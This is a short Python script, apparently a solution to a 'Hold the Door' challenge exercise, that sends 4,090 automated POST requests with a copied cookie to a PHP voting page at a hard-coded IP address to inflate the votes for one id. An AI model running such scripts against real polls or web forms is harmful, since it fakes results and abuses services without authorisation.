#!/usr/bin/python3
if __name__ == "__main__":
    import requests
    url = 'http://158.69.76.135/level1.php'
    data = {
        'id': '1190',
        'holdthedoor': 'submit',
        'key': '0'
    }
    cookies = {
        'HoldTheDoor': '0'
    }
    response = requests.get(url)
    for i in range(4090):
        cookies['holdthedoor'] = response.cookies['HoldTheDoor']
        requests.post(url, data=data, cookies=cookies)
